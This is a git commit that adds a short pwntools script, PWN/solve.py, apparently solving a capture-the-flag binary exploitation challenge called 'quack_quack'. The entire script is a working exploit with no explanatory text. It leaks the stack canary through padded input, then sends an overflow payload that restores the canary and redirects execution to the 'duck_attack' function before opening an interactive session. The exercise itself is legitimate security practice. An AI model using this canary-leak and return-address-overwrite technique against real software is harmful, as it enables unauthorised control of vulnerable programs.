4ac2c946356a51713fb1e11d104804256ac0b954
Nguyen Quoc Khanh <nguyenkhanh.pt2016@gmail.com>
2025-03-27 05:40:00 +0700

    Create solve.py

---
+++ PWN/solve.py
@@ -0,0 +1,8 @@
+from pwn import *
+r=remote("IP",port)
+elf=ELF("./quack_quack")
+r.sendafter(">","Quack Quack ".rjust(0x65,"a"))
+r.readuntil("Quack Quack ")
+canary=u64((r.recv(7).rjust(8,p8(0))))
+r.sendlineafter(">",p64(0xdeadbeefdeadbeef)*11+p64(canary)*2+p64(elf.sym.duck_attack))
+r.interactive()
